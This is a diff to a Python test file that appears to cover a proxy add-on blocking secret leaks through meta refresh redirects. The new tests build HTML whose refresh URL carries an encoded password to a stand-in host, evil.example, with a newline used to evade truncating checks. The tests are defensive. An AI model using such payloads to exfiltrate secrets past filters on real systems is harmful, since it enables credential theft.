@@ -2759,6 +2759,10 @@ class RefreshSecretTests(unittest.TestCase):
         # and navigate anyway — the check must see the same target.
         self.assertEqual(t('0;url="https://evil.example/cb?k=1'),
                          "https://evil.example/cb?k=1")
+        # A literal newline inside the unquoted target does not stop
+        # the client — and must not stop the check (issue #869).
+        self.assertEqual(t("0;url=https://evil.example/cb?pad=x\nk=1"),
+                         "https://evil.example/cb?pad=x\nk=1")
         self.assertIsNone(t("5"))
         self.assertIsNone(t("0; url="))
         self.assertIsNone(t(""))
@@ -2963,6 +2967,25 @@ class MetaRefreshSecretTests(unittest.TestCase):
         self.assertNotIn("evil.example/cb", resp.text)
         self.assertIn(("github.com", "meta-refresh-secret-refused",
                        "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_newline_before_secret_neutralized(self):
+        # Issue #869: a literal newline inside the content's url= is
+        # legal HTML — the browser strips it and navigates to the
+        # joined URL. The check target must not truncate at the
+        # newline, or a secret placed after it goes undetected.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?pad=x\nk=' + enc.encode() + b'">')
+        self.assertNotIn(SECRETS["pw"].encode(), body)  # encoded: blind
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        for _, _, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["pw"], reason)
 
     def test_meta_refresh_gt_inside_quoted_attr_still_scanned(self):
         # A `>` inside a quoted attribute BEFORE content must not
